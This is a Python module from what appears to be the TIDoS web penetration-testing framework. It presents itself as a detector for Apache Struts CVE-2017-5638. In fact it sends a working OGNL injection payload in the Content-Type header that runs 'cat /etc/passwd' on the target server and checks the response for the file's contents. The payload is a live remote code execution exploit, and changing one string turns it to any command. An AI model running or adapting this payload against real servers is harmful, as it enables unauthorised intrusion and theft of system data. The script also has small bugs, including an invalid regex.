#!/usr/bin/env python3
# coding: utf-8

#-:-:-:-:-:-:-:-:-:-:-:-:#
#    TIDoS Framework     #
#-:-:-:-:-:-:-:-:-:-:-:-:#

#Author : @_tID
#This module requires TIDoS Framework
#https://github.com/0xInfection/TIDoS-Framework



import re
#import requests
import time
#from random import *
import string
from core.Core.colors import *
from core.methods.tor import session
from core.database.database_module import save_data
from core.variables import database
from core.methods.cache import targetname
import inspect

info = "This module detects the Apache Struts Shock vulnerability. (CVE-2017-5638)"
searchinfo = "Struts Shock Detector"
properties = {}

def strutsshock0x00(web):
	requests = session()
	print(GR+' [*] Parsing strings...')
	time.sleep(0.5)
	print(GR+' [*] Configuring payloads...')
	payload = "%{(#_='multipart/form-data')."
	payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
	payload += "(#_memberAccess?"
	payload += "(#_memberAccess=#dm):"
	payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
	payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
	payload += "(#ognlUtil.getExcludedPackageNames().clear())."
	payload += "(#ognlUtil.getExcludedClasses().clear())."
	payload += "(#context.setMemberAccess(#dm))))."
	payload += "(#cmd='cat /etc/passwd')."
	payload += "(#iswin=(@java.lang.System@getProperty('os.name').tolower().contains('win')))."
	payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
	payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
	payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
	payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
	payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
	payload += "(#ros.flush())}"
	print(O+' [!] Setting Content-Type Payload : '+C+payload)
	headers = {'Content-Type': payload, 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:61.0) Gecko/20100101 Firefox/61.0'}
	time.sleep(0.5)
	print(O+' [*] Making no-verify request...')
	time.sleep(1)
	resp = requests.get(web, headers=headers, verify=False)
	if re.search(r'*?:/bin/bash',resp.content,re.I) or ('root:x' in resp.content and 'daemon:x:' in resp.content):
		print(G+' [+] Website Vulnerable to Apache Struts-Shock (CVE-2017-5638) ! ')
		save_data(database, module, lvl1, lvl2, lvl3, name, "Website Vulnerable to Apache Struts-Shock (CVE-2017-5638)!")
	else:
		print(R+' [-] The website seems immune to Apache Struts-Shock...')
		save_data(database, module, lvl1, lvl2, lvl3, name, "The website seems immune to Apache Struts-Shock.")

def strutsshock(web):
	global name
	name = targetname(web)
	global lvl2
	lvl2 = inspect.stack()[0][3]
	global module
	module = "VulnAnalysis"
	global lvl1
	lvl1 = "Critical Vulnerabilities"
	global lvl3
	lvl3 = ""
	time.sleep(0.5)
	#print(R+'\n    =======================================')
	#print(R+'\n     A P A C H E   S T R U T S   S H O C K ')
	#print(R+'    ---<>----<>----<>----<>----<>----<>----\n')

	from core.methods.print import pvln
	pvln("apache struts shock")
	             
	strutsshock0x00(web)

def attack(web):
	web = web.fullurl
	strutsshock(web)
